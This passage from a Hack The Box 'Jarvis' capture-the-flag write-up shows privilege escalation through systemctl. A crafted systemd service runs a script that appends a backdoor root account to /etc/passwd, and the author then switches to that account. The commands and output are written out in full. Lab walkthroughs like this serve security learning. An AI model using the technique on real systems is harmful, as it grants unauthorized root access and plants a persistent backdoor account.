<p>to <code class="language-plaintext highlighter-rouge">/etc/passwd</code> to enable us to <code class="language-plaintext highlighter-rouge">su</code> as root with the credentials <code class="language-plaintext highlighter-rouge">rooot : AAAA</code>. (Check <a href="/hack-the-box/ghoul/">Ghoul</a>).<br></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pepper@jarvis:/dev/shm$ nano root.service
pepper@jarvis:/dev/shm$ cat root.service
[Unit]
Description=pwned

[Service]
ExecStart=/dev/shm/root.sh

[Install]
WantedBy=multi-user.target
pepper@jarvis:/dev/shm$ nano root.sh
pepper@jarvis:/dev/shm$ chmod +x root.sh
pepper@jarvis:/dev/shm$ cat root.sh
#!/bin/bash
echo 'rooot:gDlPrjU6SWeKo:0:0:root:/root:/bin/bash' &gt;&gt; /etc/passwd
pepper@jarvis:/dev/shm$ 
</code></pre></div></div>
<p>I enabled the service and started it:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pepper@jarvis:/dev/shm$ systemctl enable /dev/shm/root.service
Created symlink /etc/systemd/system/multi-user.target.wants/root.service -&gt; /dev/shm/root.service.
Created symlink /etc/systemd/system/root.service -&gt; /dev/shm/root.service.
pepper@jarvis:/dev/shm$ systemctl start root.service
pepper@jarvis:/dev/shm$
</code></pre></div></div>
<p>Now if we check <code class="language-plaintext highlighter-rouge">/etc/passwd</code> we’ll see that it has been modified:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pepper@jarvis:/dev/shm$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
messagebus:x:105:110::/var/run/dbus:/bin/false
pepper:x:1000:1000:,,,:/home/pepper:/bin/bash
mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:107:65534::/run/sshd:/usr/sbin/nologin
rooot:gDlPrjU6SWeKo:0:0:root:/root:/bin/bash
pepper@jarvis:/dev/shm$
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pepper@jarvis:/dev/shm$ su rooot 
Password: 
root@jarvis:/dev/shm# id
uid=0(root) gid=0(root) groups=0(root)
root@jarvis:/dev/shm# whoami
root
root@jarvis:/dev/shm# cd /root/
root@jarvis:~# ls -al
total 52
drwx------  6 root root 4096 Mar  5  2019 .
drwxr-xr-x 23 root root 4096 Mar  3  2019 ..
lrwxrwxrwx  1 root root    9 Mar  4  2019 .bash_history -&gt; /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x  4 root root 4096 Mar  3  2019 .cache
-rwxr--r--  1 root root   42 Mar  4  2019 clean.sh
drwxr-xr-x  3 root root 4096 Mar  3  2019 .config
drwxr-xr-x  3 root root 4096 Mar  3  2019 .local
lrwxrwxrwx  1 root root    9 Mar  4  2019 .mysql_history -&gt; /dev/null
drwxr-xr-x  2 root root 4096 Mar  2  2019 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
lrwxrwxrwx  1 root root    9 Mar  4  2019 .python_history -&gt; /dev/null
-r--------  1 root root   33 Mar  5  2019 root.txt
-rw-r--r--  1 root root   66 Mar  4  2019 .selected_editor
-rwxr-xr-x  1 root root 5271 Mar  5  2019 sqli_defender.py
root@jarvis:~# 
</code></pre></div></div>

<p><br><img src="/images/hackthebox/jarvis/18.png" alt="" class="align-center"><br><br>
And we owned root !
<br>That’s it , Feedback is appreciated !
<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
<br>Thanks for reading.<br></p>

<p>Previous Hack The Box write-up : <a href="/hack-the-box/haystack/">Hack The Box - Haystack</a>
<br>Next Hack The Box write-up : <a href="/hack-the-box/networked/">Hack The Box - Networked</a></p>

        
      </section>

      <footer class="page__meta">
        
        


        

  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-11-09T07:00:00+02:00">November 9, 2019</time></p>


      </footer>

      

      
  <nav class="pagination">
    
      <a href="/hack-the-box/haystack/" class="pagination--pager" title="Hack The Box - Haystack
">Previous</a>
    
    
      <a href="/hack-the-box/networked/" class="pagination--pager" title="Hack The Box - Networked
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>
    </div>

    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
    <ul class="social-icons">
      
  
      
  
      
    </ul>
  </div>
      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>







  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2', { 'anonymize_ip': false});
</script>









  </body>
</html>
